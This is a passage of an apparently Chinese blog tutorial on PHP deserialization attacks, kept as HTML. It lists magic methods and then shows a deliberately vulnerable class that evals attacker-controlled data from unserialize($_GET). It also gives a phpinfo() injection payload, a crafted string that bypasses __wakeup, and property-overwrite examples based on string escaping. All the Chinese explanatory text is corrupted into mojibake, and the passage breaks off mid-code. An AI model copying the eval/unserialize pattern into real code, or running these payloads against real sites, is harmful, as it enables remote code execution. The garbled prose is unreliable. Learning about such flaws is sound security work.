<span class="token function">unserailize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ÂáΩÊï∞ÁöÑÂèÇÊï∞ÂøÖÈ°ªÂèØÊéßÔºà‰∏∫‰∫ÜÊàêÂäüËææÂà∞ÊéßÂà∂‰Ω†ËæìÂÖ•ÁöÑÂèÇÊï∞ÊâÄÂÆûÁé∞ÁöÑÂäüËÉΩÔºåÂèØËÉΩÈúÄË¶ÅÁªïËøá‰∏Ä‰∫õÈ≠îÊ≥ïÂáΩÊï∞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="phpÁöÑÈ≠îÊ≥ïÊñπÊ≥ï"><a class="markdownIt-Anchor" href="#phpÁöÑÈ≠îÊ≥ïÊñπÊ≥ï"></a> PHPÁöÑÈ≠îÊ≥ïÊñπÊ≥ï</h4>
<p>PHP Â∞ÜÊâÄÊúâ‰ª• __Ôºà‰∏§‰∏™‰∏ãÂàíÁ∫øÔºâÂºÄÂ§¥ÁöÑÁ±ªÊñπÊ≥ï‰øùÁïô‰∏∫È≠îÊúØÊñπÊ≥ï„ÄÇÊâÄ‰ª•Âú®ÂÆö‰πâÁ±ªÊñπÊ≥ïÊó∂ÔºåÈô§‰∫Ü‰∏äËø∞È≠îÊúØÊñπÊ≥ïÔºåÂª∫ËÆÆ‰∏çË¶Å‰ª• __ ‰∏∫ÂâçÁºÄ„ÄÇ Â∏∏ËßÅÁöÑÈ≠îÊ≥ïÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">__<span class="token function">construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞

__<span class="token function">destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÁ±ªÁöÑÊûêÊûÑÂáΩÊï∞

__<span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÂú®ÂØπË±°‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂèØËÆøÈóÆÊñπÊ≥ïÊó∂Ë∞ÉÁî®

__<span class="token function">callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÁî®ÈùôÊÄÅÊñπÂºè‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂèØËÆøÈóÆÊñπÊ≥ïÊó∂Ë∞ÉÁî®

__<span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåËé∑Âæó‰∏Ä‰∏™Á±ªÁöÑÊàêÂëòÂèòÈáèÊó∂Ë∞ÉÁî®

__<span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåËÆæÁΩÆ‰∏Ä‰∏™Á±ªÁöÑÊàêÂëòÂèòÈáèÊó∂Ë∞ÉÁî®

__<span class="token function">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÂΩìÂØπ‰∏çÂèØËÆøÈóÆÂ±ûÊÄßË∞ÉÁî®<span class="token function">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Êàñ<span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Êó∂Ë∞ÉÁî®

__<span class="token function">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÂΩìÂØπ‰∏çÂèØËÆøÈóÆÂ±ûÊÄßË∞ÉÁî®<span class="token function">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Êó∂Ë¢´Ë∞ÉÁî®„ÄÇ

__<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÊâßË°å<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Êó∂ÔºåÂÖà‰ºöË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞

__<span class="token function">wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÊâßË°å<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Êó∂ÔºåÂÖà‰ºöË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞

__<span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÁ±ªË¢´ÂΩìÊàêÂ≠óÁ¨¶‰∏≤Êó∂ÁöÑÂõûÂ∫îÊñπÊ≥ï

__<span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåË∞ÉÁî®ÂáΩÊï∞ÁöÑÊñπÂºèË∞ÉÁî®‰∏Ä‰∏™ÂØπË±°Êó∂ÁöÑÂõûÂ∫îÊñπÊ≥ï

__set_<span class="token function">state</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåË∞ÉÁî®var_<span class="token function">export</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÂØºÂá∫Á±ªÊó∂ÔºåÊ≠§ÈùôÊÄÅÊñπÊ≥ï‰ºöË¢´Ë∞ÉÁî®„ÄÇ

__<span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÂΩìÂØπË±°Â§çÂà∂ÂÆåÊàêÊó∂Ë∞ÉÁî®

__<span class="token function">autoload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÂ∞ùËØïÂä†ËΩΩÊú™ÂÆö‰πâÁöÑÁ±ª

__<span class="token function">debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºåÊâìÂç∞ÊâÄÈúÄË∞ÉËØï‰ø°ÊÅØ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(1) <code>__construct()</code>ÔºöÂΩìÂØπË±°ÂàõÂª∫Êó∂‰ºöËá™Âä®Ë∞ÉÁî®(‰ΩÜÂú®unserialize()Êó∂ÊòØ‰∏ç‰ºöËá™Âä®Ë∞ÉÁî®ÁöÑ)„ÄÇ<br />
(2) <code>__wakeup()</code> Ôºöunserialize()Êó∂‰ºöËá™Âä®Ë∞ÉÁî®<br />
(3) <code>__destruct()</code>ÔºöÂΩìÂØπË±°Ë¢´ÈîÄÊØÅÊó∂‰ºöËá™Âä®Ë∞ÉÁî®„ÄÇ<br />
(4) <code>__toString()</code>:ÂΩìÂèçÂ∫èÂàóÂåñÂêéÁöÑÂØπË±°Ë¢´ËæìÂá∫Âú®Ê®°Êùø‰∏≠ÁöÑÊó∂ÂÄôÔºàËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤ÁöÑÊó∂ÂÄôÔºâËá™Âä®Ë∞ÉÁî®<br />
(5) <code>__get()</code> :ÂΩì‰ªé‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄßËØªÂèñÊï∞ÊçÆ<br />
(6) <code>__call()</code>: Âú®ÂØπË±°‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë</p>
<p>ÂÖ∂‰∏≠ÁâπÂà´ËØ¥Êòé‰∏Ä‰∏ãÁ¨¨ÂõõÁÇπÔºö</p>
<p>Ëøô‰∏™ __toString Ëß¶ÂèëÁöÑÊù°‰ª∂ÊØîËæÉÂ§öÔºå‰πüÂõ†‰∏∫Ëøô‰∏™ÂéüÂõ†ÂÆπÊòìË¢´ÂøΩÁï•ÔºåÂ∏∏ËßÅÁöÑËß¶ÂèëÊù°‰ª∂Êúâ‰∏ãÈù¢Âá†Áßç</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span> ÊâìÂç∞Êó∂‰ºöËß¶Âèë

<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ÂèçÂ∫èÂàóÂåñÂØπË±°‰∏éÂ≠óÁ¨¶‰∏≤ËøûÊé•Êó∂

<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>ÂèçÂ∫èÂàóÂåñÂØπË±°ÂèÇ‰∏éÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Êó∂

<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>ÂèçÂ∫èÂàóÂåñÂØπË±°‰∏éÂ≠óÁ¨¶‰∏≤ËøõË°å<span class="token operator">==</span>ÊØîËæÉÊó∂Ôºà<span class="token constant">PHP</span>ËøõË°å<span class="token operator">==</span>ÊØîËæÉÁöÑÊó∂ÂÄô‰ºöËΩ¨Êç¢ÂèÇÊï∞Á±ªÂûãÔºâ

<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>ÂèçÂ∫èÂàóÂåñÂØπË±°ÂèÇ‰∏éÊ†ºÂºèÂåñ<span class="token constant">SQL</span>ËØ≠Âè•ÔºåÁªëÂÆöÂèÇÊï∞Êó∂

<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>ÂèçÂ∫èÂàóÂåñÂØπË±°Âú®ÁªèËøáphpÂ≠óÁ¨¶‰∏≤ÂáΩÊï∞ÔºåÂ¶Ç <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>„ÄÅ<span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Êó∂

<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>Âú®<span class="token function">in_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÊñπÊ≥ï‰∏≠ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÂèçÂ∫èÂàóÂåñÂØπË±°ÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÁöÑÊï∞ÁªÑ‰∏≠ÊúâtoStringËøîÂõûÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÊó∂ÂÄôtoString‰ºöË¢´Ë∞ÉÁî®

<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>ÂèçÂ∫èÂàóÂåñÁöÑÂØπË±°‰Ωú‰∏∫ <span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ÁöÑÂèÇÊï∞ÁöÑÊó∂ÂÄô<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Â∏∏ËßÅÊîªÂáª"><a class="markdownIt-Anchor" href="#Â∏∏ËßÅÊîªÂáª"></a> Â∏∏ËßÅÊîªÂáª</h2>
<h3 id="‰æãÈ¢ò1"><a class="markdownIt-Anchor" href="#‰æãÈ¢ò1"></a> ‰æãÈ¢ò1</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">K0rz3n</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$K0rz3n</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"i am K0rz3n"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">L</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">L</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to XDSEC"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">var</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Áî±‰∫éÂèçÂ∫èÂàóÂåñÔºåÊàë‰ª¨ÂèØ‰ª•ÂèØÊéßÁ±ªÈáåÈù¢ÁöÑÂèÇÊï∞ÔºåÂè™Ë¶Å<code>test2</code>Êõ¥Êîπ‰∏∫ÊÅ∂ÊÑè‰ª£Á†ÅÂ∞±ÂèØ‰ª•Âà©Áî®<code>K0rz3n</code>ËøõË°åÊâßË°å</p>
<p>payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">K0rz3n</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">var</span> <span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$K0rz3n</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">K0rz3n</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$K0rz3n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"seria.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703165137530.png" class="" alt="image-20240703165137530" loading="lazy">
<p>Êõ¥Â§çÊùÇÁöÑÂà©Áî®ÊòØË¶ÅÊûÑÈÄ†ÈìæÂ≠êÊù•ËøõË°åÂà©Áî®</p>
<p>Âç≥POPÈìæ</p>
<h3 id="__wakeupÂáΩÊï∞ÁªïËøá"><a class="markdownIt-Anchor" href="#__wakeupÂáΩÊï∞ÁªïËøá"></a> __wakeup()ÂáΩÊï∞ÁªïËøá</h3>
<p>ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨</p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>ÊºèÊ¥ûÂéüÁêÜÂèäË¶ÅÁÇπ</p>
<p>__wakeup()ÂáΩÊï∞Ëß¶Âèë‰∫éunserilize()Ë∞ÉÁî®‰πãÂâçÔºå‰ΩÜÊòØÂ¶ÇÊûúË¢´ÂèçÂ∫èÂàóËØùÁöÑÂ≠óÁ¨¶‰∏≤ÂÖ∂‰∏≠ÂØπÂ∫îÁöÑÂØπË±°ÁöÑÂ±ûÊÄß‰∏™Êï∞ÂèëÁîüÂèòÂåñÊó∂Ôºå‰ºöÂØºËá¥ÂèçÂ∫èÂàóÂåñÂ§±Ë¥•ËÄåÂêåÊó∂‰ΩøÂæó __wakeup()ÂáΩÊï∞Â§±Êïà„ÄÇÂΩìÊàêÂëòÂ±ûÊÄßÊï∞ÁõÆÂ§ß‰∫éÂÆûÈôÖÊï∞ÁõÆÊó∂‰ºöË∑≥Ëøá __wakeup()ÂáΩÊï∞ÁöÑÊâßË°å„ÄÇ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">obj</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>

<span class="token keyword">var</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

<span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

<span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$inner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:1:&#123;i:0;O:9:"Exception":2:&#123;s:7:"'</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token string single-quoted-string">'file";R:4;&#125;'</span><span class="token punctuation">;</span>

<span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:2:&#123;i:0;C:3:"obj":'</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$inner</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':&#123;'</span><span class="token operator">.</span><span class="token variable">$inner</span><span class="token operator">.</span><span class="token string single-quoted-string">'&#125;i:1;R:4;&#125;'</span><span class="token punctuation">;</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏"><a class="markdownIt-Anchor" href="#ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏"></a> ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏</h3>
<h4 id="ÂâçÁΩÆÁü•ËØÜ"><a class="markdownIt-Anchor" href="#ÂâçÁΩÆÁü•ËØÜ"></a> ÂâçÁΩÆÁü•ËØÜÔºö</h4>
<p>ÁâπÁÇπ1ÔºöphpÂú®ÂèçÂ∫èÂàóÂåñÊó∂ÔºåÂ∫ïÂ±Ç‰ª£Á†ÅÊòØ‰ª• ; ‰Ωú‰∏∫Â≠óÊÆµÁöÑÂàÜÈöîÔºå‰ª• } ‰Ωú‰∏∫ÁªìÂ∞æÔºåÂπ∂‰∏îÊòØÊ†πÊçÆÈïøÂ∫¶Âà§Êñ≠ÂÜÖÂÆπÁöÑ ÔºåÂêåÊó∂ÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ã‰∏≠ÂøÖÈ°ª‰∏•Ê†ºÊåâÁÖßÂ∫èÂàóÂåñËßÑÂàôÊâçËÉΩÊàêÂäüÂÆûÁé∞ÂèçÂ∫èÂàóÂåñ ÔºåË∂ÖÂá∫ÁöÑÈÉ®ÂàÜÂπ∂‰∏ç‰ºöË¢´ÂèçÂ∫èÂàóÂåñÊàêÂäüÔºåËøôËØ¥ÊòéÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ãÊòØÊúâ‰∏ÄÂÆöËØÜÂà´ËåÉÂõ¥ÁöÑÔºåÂú®Ëøô‰∏™ËåÉÂõ¥‰πãÂ§ñÁöÑÂ≠óÁ¨¶ÈÉΩ‰ºöË¢´ÂøΩÁï•Ôºå‰∏çÂΩ±ÂìçÂèçÂ∫èÂàóÂåñÁöÑÊ≠£Â∏∏ËøõË°å„ÄÇËÄå‰∏îÂèØ‰ª•ÁúãÂà∞ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÉΩÊòØ‰ª•<code>&quot;;&#125;\</code>ÁªìÊùüÁöÑÔºåÈÇ£Â¶ÇÊûúÊää<code>&quot;;&#125;\</code>Ê∑ªÂÖ•Âà∞ÈúÄË¶ÅÂèçÂ∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠ÔºàÈô§‰∫ÜÁªìÂ∞æÂ§ÑÔºâÔºåÂ∞±ËÉΩËÆ©ÂèçÂ∫èÂàóÂåñÊèêÂâçÈó≠ÂêàÁªìÊùüÔºåÂêéÈù¢ÁöÑÂÜÖÂÆπÂ∞±Áõ∏Â∫îÁöÑ‰∏¢ÂºÉ‰∫Ü„ÄÇ<br />
ÁâπÁÇπ2ÔºöÈïøÂ∫¶‰∏çÂØπÂ∫î‰ºöÊä•Èîô</p>
<p>ÊºèÊ¥û‰∫ßÁîüÔºöÂèçÂ∫èÂàóÂåñ‰πãÊâÄ‰ª•Â≠òÂú®Â≠óÁ¨¶ÈÄÉÈÄ∏ÔºåÊúÄ‰∏ªË¶ÅÁöÑÂéüÂõ†ÊòØ‰ª£Á†Å‰∏≠Â≠òÂú®ÈíàÂØπÂ∫èÂàóÂåñÔºàserialize()ÔºâÂêéÁöÑÂ≠óÁ¨¶‰∏≤ËøõË°å‰∫ÜËøáÊª§Êìç‰ΩúÔºàÂèòÂ§öÊàñËÄÖÂèòÂ∞ëÔºâ„ÄÇ</p>
<p>ÊºèÊ¥ûÂ∏∏ËßÅÊù°‰ª∂ÔºöÂ∫èÂàóÂåñÂêéËøáÊª§ÂÜçÂéªÂèçÂ∫èÂàóÂåñ</p>
<h4 id="‰∏ÄÊõøÊç¢‰øÆÊîπÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÈïø"><a class="markdownIt-Anchor" href="#‰∏ÄÊõøÊç¢‰øÆÊîπÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÈïø"></a> ‰∏ÄÊõøÊç¢‰øÆÊîπÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÈïø</h4>
<p>Á§∫‰æã‰ª£Á†ÅÔºö</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ccc'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span>
<span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaaa'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$AA</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$AA</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Áî±‰∫éËØ•‰ª£Á†Å‰∏≠ÔºåËæìÂÖ•ÁöÑÂØπË±°Áî®Êà∑‰∏çÂèØÊéßÔºåÂà©Áî®Â≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏Êàë‰ª¨‰ªçÁÑ∂ÂèØ‰ª•‰øÆÊîπÂ±ûÊÄßÂÄº</p>
<p>Âõ†‰∏∫ÁªèËøá<code>filter</code>Âêé</p>
<p>Áî±‰∫éÂ±ûÊÄßÁöÑÈïøÂ∫¶ÔºåÁªèËøáphpÂèçÂ∫èÂàóÂåñËß£ÊûêÔºåÊØèÂΩìÂ≠óÁ¨¶‰∏≤Â≠òÂú®‰∏Ä‰∏™<code>bb</code>Â∞±‰ºöÈÄÉÈÄ∏‰∏Ä‰∏™Â≠óÁ¨¶ÔºåÂ¶ÇÊûúÈÄÉÈÄ∏ÁöÑÂ≠óÁ¨¶‰∏≠Â≠òÂú®<code>;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></p>
<p>‰ºöÂØºËá¥Ëß£ÊûêÊèêÂâçÈó≠ÂêàÔºåËøõËÄåÈó¥Êé•‰øÆÊîπÂ±ûÊÄß<code>pass</code></p>
<h4 id="‰∫åÊõøÊç¢‰πãÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÁü≠"><a class="markdownIt-Anchor" href="#‰∫åÊõøÊç¢‰πãÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÁü≠"></a> ‰∫åÊõøÊç¢‰πãÂêéÂØºËá¥Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèòÁü≠</h4>
<p>Á§∫‰æã‰ª£Á†Å</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">str_rep</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
